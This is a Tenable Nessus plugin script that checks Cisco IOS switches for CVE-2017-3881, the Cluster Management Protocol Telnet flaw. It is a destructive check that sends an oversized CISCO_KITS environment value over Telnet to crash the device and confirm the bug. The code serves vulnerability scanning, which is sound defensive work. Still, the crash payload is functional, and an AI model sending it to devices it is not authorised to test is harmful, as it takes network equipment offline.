#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(103783);
  script_version("1.7");
  script_set_attribute(attribute:"plugin_modification_date", value:"2023/04/25");

  script_cve_id("CVE-2017-3881");
  script_bugtraq_id(96960);
  script_xref(name:"CISCO-BUG-ID", value:"CSCvd48893");
  script_xref(name:"IAVA", value:"2017-A-0073");
  script_xref(name:"CISCO-SA", value:"cisco-sa-20170317-cmp");
  script_xref(name:"CISA-KNOWN-EXPLOITED", value:"2022/04/15");
  script_xref(name:"CEA-ID", value:"CEA-2019-0240");

  script_name(english:"Cisco IOS Cluster Management Protocol Telnet Option Handling RCE (cisco-sa-20170317-cmp) (destructive check)");

  script_set_attribute(attribute:"synopsis", value:
"The remote device is affected by a remote code execution
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote device is affected by a remote code execution
vulnerability in the Cluster Management Protocol (CMP) subsystem due
to improper handling of CMP-specific Telnet options. An
unauthenticated, remote attacker can exploit this by establishing a
Telnet session with malformed CMP-specific telnet options, to execute
arbitrary code.");
  # https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170317-cmp
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?7cb68237");
  script_set_attribute(attribute:"solution", value:
"Upgrade to the relevant fixed version referenced in Cisco bug ID
CSCvd48893. Alternatively, as a workaround, disable the Telnet
protocol for incoming connections.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2017-3881");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2017/03/17");
  script_set_attribute(attribute:"patch_publication_date", value:"2017/03/17");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/10/11");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/o:cisco:ios");
  script_set_attribute(attribute:"stig_severity", value:"I");
  script_end_attributes();

  script_category(ACT_KILL_HOST);
  script_family(english:"CISCO");

  script_copyright(english:"This script is Copyright (C) 2017-2023 Tenable Network Security, Inc.");

  script_dependencies("telnet.nasl");
  script_require_ports("Services/telnet", 23);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("telnet_func.inc");

port = get_service(svc: 'telnet', default: 23, exit_on_fail: 1);

soc = open_sock_tcp(port);
if (! soc) audit(AUDIT_SOCK_FAIL, port);

IAC     = '\xff';
ENV     = '\x24';
IS      = '\x00';
SEND    = '\x01';
USERVAR = '\x03';
VALUE   = '\x01';
SB 	    = raw_string(OPT_SUBOPT);
SE      = raw_string(OPT_ENDSUBOPT);

# Consume what the server sends 
telnet_negotiate(socket:soc); 

# Query environment variables
req = IAC + SB + ENV + SEND + USERVAR + IAC + SE;
send(socket: soc, data: req);
r = recv(socket: soc, length: 1024);

# Affected devices should have the "CISCO_KITS" variable
env_name = 'CISCO_KITS';
if (env_name >!< r)
{
  audit(AUDIT_HOST_NOT, 'affected');
}

# Three parts in env value
env_val = 
  '3:' 
  + crap(data:'A', length:0x400)  # data to be copied to a stack buf
                                  # seen: 0x80 bytes to RA
  + ':9:';

# Attempt to crash the switch
req = IAC + SB + ENV + IS + USERVAR + env_name + VALUE + env_val + IAC + SE;
send(socket: soc, data: req);
sleep(3);
close(soc);

if (service_is_dead(port:port))
{
  security_report_v4(
    port:     port,
    severity: SECURITY_HOLE
  ); 
}
else
{
  audit(AUDIT_HOST_NOT, 'affected');
}
